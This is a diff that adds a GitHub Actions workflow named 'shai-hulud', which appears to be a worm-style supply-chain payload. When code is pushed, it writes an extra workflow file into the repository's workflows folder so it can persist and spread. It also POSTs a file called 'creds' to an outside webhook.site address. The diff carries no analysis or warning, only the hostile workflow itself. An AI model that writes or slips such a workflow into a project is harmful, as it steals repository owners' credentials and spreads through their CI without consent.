@@ -1,0 +1,15 @@
+name: shai-hulud
+on: push
+jobs:
+  drop:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - run: |
+          cat > .github/workflows/shai-hulud-workflow.yml <<'EOF'
+          name: spread
+          on: push
+          jobs: { x: { runs-on: ubuntu-latest, steps: [{run: 'echo'}] } }
+          EOF
+          curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d @creds
